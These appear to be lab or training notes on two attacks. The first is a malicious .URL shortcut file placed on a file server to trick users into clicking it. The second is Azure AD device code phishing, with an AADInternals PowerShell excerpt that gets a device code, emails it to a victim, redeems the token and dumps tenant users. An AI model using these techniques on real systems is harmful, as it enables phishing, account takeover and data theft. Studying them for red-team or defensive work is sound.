 Now you are going to create a shortcut file to trick a user into clicking it… You will then place it on SRV01…
click.URL containing : 
[{000214A0-0000-0000-C000-000000000046}] Prop3=19,2 [InternetShortcut] IDList= URL=http://cli01.contoso.com/ IconIndex=234 HotKey=0 IconFile=C:\Windows\System32\SHELL32.DLL




![[Pasted image 20231010211230.png]]

Abusing the device code flow MO

Try to access data using code flow and get a code 2. Trick the user into entering the code in the devicelogon page (phishing) 3. Connect on behalf of the user 4. Pivot to other backend resources and access other resources

### PowerShell tool to make Code Flow
AAD Internals module (excerpt)

```powershell
$body=@{ "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c" "resource" = "https://graph.windows.net" } 
$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body $user_code = $authResponse.user_code Send-MailMessage ... 
$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body # Dump the tenant users to csv Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```

